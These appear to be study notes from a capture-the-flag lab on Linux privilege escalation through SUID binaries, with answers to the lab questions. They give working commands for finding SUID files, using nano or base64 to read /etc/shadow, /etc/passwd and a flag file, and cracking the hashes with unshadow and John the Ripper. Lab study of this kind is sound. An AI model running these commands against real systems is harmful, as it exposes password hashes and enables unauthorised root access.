Much of Linux privilege controls rely on controlling the users and files interactions. This is done with permissions. This changes with SUID (Set-user Identification) and SGID (Set-group Identification) that allow files to be executed with the permission level of the file owner or the group owner, respectively.  
 
*Note* 
These type of files have an “**s**” bit set showing their special permission level.

`find / -type f -perm -04000 -ls 2>/dev/null` will list files that have SUID or SGID bits set.
	![[Pasted image 20240823202311.png]]
The SUID bit set for the nano text editor allows us to create, edit and read files using the file owner’s privilege. Nano is owned by root, which probably means that we can read and edit files at a higher privilege level than our current user has. At this stage, we have two basic options for privilege escalation: 
- reading the `/etc/shadow` file 
- adding our user to `/etc/passwd`.

## reading the `/etc/shadow` file
Running `find / -type f -perm -04000 -ls 2>/dev/null` command we observe that the **nano** text editor has the SUID "**s**" bit set.

Using `nano /etc/shadow` we will read the contents of the /etc/shadow file. Using the unshadow tool we will create a file crackable by John the Ripper. To achieve this, unshadow needs both the `/etc/shadow` and `/etc/passwd` files.

```
unshadow passwd.txt shadow.txt > passwords.txt 
john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
```

## **Examples**
Q) Which user shares the name of a great comic book writer?
	```base64 /etc/passwd | base64 -decode```
	![[Pasted image 20240823223110.png]]

Q) What is the password of user2?
	```base64 /etc/shadow | base64 -decode```
	`unshadow passwd.txt shadow.txt > passwords.txt`
	`john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt`
	![[Pasted image 20240823223330.png]]

Q)What is the content of the flag3.txt file?
	same trick on encoding and decoding to gain read acces: 
		`base64 /home/ubuntu/flag3.txt | base64 -d`